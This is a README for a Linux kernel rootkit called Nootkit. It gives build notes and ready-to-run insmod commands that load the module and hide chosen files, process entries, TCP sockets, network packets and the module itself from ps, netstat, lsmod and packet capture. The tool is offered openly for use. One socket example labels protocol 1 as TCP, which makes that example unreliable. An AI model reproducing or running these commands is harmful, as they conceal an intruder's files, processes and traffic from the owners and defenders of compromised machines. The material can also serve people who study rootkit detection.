# Nootkit

Noot noot?
![noot?](https://i.kym-cdn.com/entries/icons/original/000/040/642/terrifiednootnoot.jpg)

A basic rootkit with resource hiding capabilities.

You are welcome to browse the [story-oriented documentation](docs/section-1.md)
or give it a go.

## Compiling

Currently only Ubuntu 22 LTS kernels of version 5.15.0-76 are supported -
and to compile the module you'll have to get the corresponding headers as they aren't
included.

Headers are assumed to be located at `kernel-headers/linux-headers-5.15.0-76-generic`,
in the same exact structure as they are present on Ubuntu machines at
`/lib/modules/5.15.0-76-generic`.

## Usage

`nootkit` can receive a configuration through module parameters -
which are at the moment not exposed after the module has been loaded.

An example `insmod` command to set certain filenames and inodes to be hidden
from common usermode APIs is:

```sh
insmod /nootkit.ko \
kallsyms_lookup_name=0x$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
hide_filenames=hello,bigboy \
hide_inodes=138210,17635,1337
```

### Configuration

The kernel space address of `kallsyms_lookup_name` must be provided to the module at load time,
as it is used to locate other unexported symbols.

Possible module arguments are:

- `kallsyms_lookup_name`: Must be present, can be obtained via `/proc/kallsyms` as shown above
- `hide_filenames`: Comma-separated list of file names and absolute paths to hide from usermode dir listings
- `hide_inodes`: Comma-separated list of inode numbers to hide from usermode dir listings
- `hide_sockets`: Comma-separated list of socket filter strings following the format (explained
  [below](#socket-filter-format)) - IPv4 socket matching this filter will be hidden from `netstat` commands.
- `hide_packets`: Comma-separated list of packet filter strings following the format (explained [below](#packet-filter-format))

You are also welcome to check out the [makefile](Makefile) for some semi-automatic tests.

#### Socket Filter Format

Pretty simple really, just follow this template:

```txt
IP PROTO = 6; LOCAL = 0.0.0.0/0.0.0.0:1300-1400; FOREIGN = 0.0.0.0/0.0.0.0:0-65535;
```

Where `PROTO` is a valid IP protocol number, although only TCP sockets are supported.
`PROTO` 0 is magic and matches any protocol number.

`LOCAL` describes the local IP/Mask:PortRangeStart-PortRangeEnd, and `FOREIGN` does the same for... The foreign address.

Port ranges are *inclusive*. Spaces aren't mandatory anywhere.

#### Packet Filter Format

A lot like the socket filter format above (even represented the same in memory!), but a little more detailed:

```txt
ETH PROTO = 0; ETH SRC = 00:00:00:00:00:00; ETH DST = 00:00:00:00:00:00; IP PROTO = 6; IP SRC = 0.0.0.0/0.0.0.0:0-65535; IP DST = 0.0.0.0/0.0.0.0:1300-1350;

# Or ARP for example

ETH PROTO = 0806; ETH SRC = 00:00:00:00:00:00; ETH DST = 00:00:00:00:00:00; IP PROTO = 0; IP SRC = 0.0.0.0/0.0.0.0:0-65535; IP DST = 0.0.0.0/0.0.0.0:0-65535;
```

Again the `PROTO`s are each valid protocol numbers for their respective protocol, and 0 is magic and matches all protocols.
Note that `ETH PROTO` parses input as *hexadecimal*.

## Features

### Hiding Files From Dir Listings

Examples:

#### Hide all files named `hello`, no matter the path, from dir listings

```sh
insmod /nootkit.ko \
kallsyms_lookup_name=0x$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
hide_filenames=hello
```

#### In addition, hide the paths `/root/bigboy` and `/home/john/wayne`

```sh
insmod /nootkit.ko \
kallsyms_lookup_name=0x$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
hide_filenames=hello,/root/bigboy,/home/john/wayne
```

#### Hide all files with an inode number of `524290`

```sh
insmod /nootkit.ko \
kallsyms_lookup_name=0x$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
hide_inodes=524290
```

### Hiding Processes From Various Utilities

Hiding processes from various utilities including `ps` can be done by hiding the path `/proc/[pid]` corresponding
to the process. There is no specific API at the moment specific to hiding processes.

For example:

#### Hide the processes with PIDs `7047` and `682` from `ps`

```sh
insmod /nootkit.ko \
kallsyms_lookup_name=0x$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
hide_filenames=/proc/7047,/proc/682
```

### Hiding TCP Sockets From Various Utilities

Sockets can be hidden from `netstat` and other utilities by specifying their properties in the socket filter format
shown [above](#socket-filter-format).

Example:

#### Hide all sockets bound to local TCP ports 10 to 30, on the local address 192.168.122.122

```sh
insmod /nootkit.ko \
kallsyms_lookup_name=0x$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
"hide_sockets=\"PROTO = 1; LOCAL = 192.168.122.122/255.255.255.255:10-30; FOREIGN = 0.0.0.0/0.0.0.0:0-65535;\""
```

### Hiding Packets

Packets can be hidden at a very low level - neither `AF_PACKET` sockets or even XDP BPF running in the generic
context will see them.
Packets can be hidden by specifying their properties in the packet filter format shown [above](#packet-filter-format).

Example:

#### Hide all TCP packets directed to port 1337, and all ARP packets in general

```sh
insmod /nootkit.ko \
kallsyms_lookup_name=0x$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
"hide_packets=\" \
ETH PROTO = 0; ETH SRC = 00:00:00:00:00:00; ETH DST = 00:00:00:00:00:00; IP PROTO = 6; IP SRC = 0.0.0.0/0.0.0.0:0-65535; IP DST = 0.0.0.0/0.0.0.0:1337-1337;, \
ETH PROTO = 0806; ETH SRC = 00:00:00:00:00:00; ETHDST = 00:00:00:00:00:00; IPPROTO = 0; IP SRC = 0.0.0.0/0.0.0.0:0-65535; IP DST = 0.0.0.0/0.0.0.0:0-65535; \
\""
```

### Hiding The Module Itself

`nootkit`'s self hiding feature is quite basic at the moment - it only hides from `/proc/modules`, making it
invisible to `lsmod`. It is still however visible under `/sys/module`.

To allow removing the module, a hook is installed for the syscall `delete_module`, such that running `rmmod nootkit`
*once* disables the hiding of the module, and running it again removes the module regularly. See the reason
for this implementation in [src/arch/x86_64/hide/module_sys.c](src/arch/x86_64/hide/module_sys.c).
